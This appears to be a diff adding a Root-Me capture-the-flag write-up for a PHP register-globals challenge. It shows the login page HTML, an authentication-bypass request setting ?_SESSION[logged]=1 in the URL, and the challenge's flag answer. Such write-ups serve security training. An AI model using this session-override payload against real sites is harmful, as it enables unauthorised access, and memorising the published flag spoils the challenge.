@@ -2809,7 +2809,84 @@ DAPt9D2mky0APAF
 ### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
 
 ---
-	
+
+
+## PHP register globals
+
+- Author: g0uZ
+- Date: 08 October 2011
+- Points: 25
+- Level: 3
+
+### Statement
+
+It seems that the developper often leaves backup files around...
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch17/).
+
+### Resources
+
+1. [Using register globals in PHP](https://repository.root-me.org/Programmation/PHP/EN%20-%20Using%20register%20globals%20in%20PHP.pdf).
+2. [OWASP testing guide v4](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v4.pdf).
+3. [OWASP testing guide v3](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v3.pdf).
+4. [OWASP testing guide v2](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v2.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+We can see the site source code:
+
+~~~html
+<html>
+  <head>
+  </head>
+  <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+    <h1>Authentication v 0.05</h1>
+    <form action="" method="POST">
+      Password&nbsp;<br/>
+      <input type="password" name="password" /><br/><br/>
+      <br/><br/>
+      <input type="submit" value="connect" /><br/><br/>
+    </form>
+    <h3>try again</h3>
+  </body>
+</html>
+~~~
+
+As detailed on [stack overflow](https://stackoverflow.com/questions/21368051/register-globals-exploit-session-array) we can exploit the session data variable using ?_SESSION[logged]=1
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch17/?_SESSION[logged]=1
+~~~
+
+This provides the solution.
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+NoTQYipcRKkgrqG
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+
 Last updated Jan 2022.
 
 ## [djm89uk.github.io](https://djm89uk.github.io)
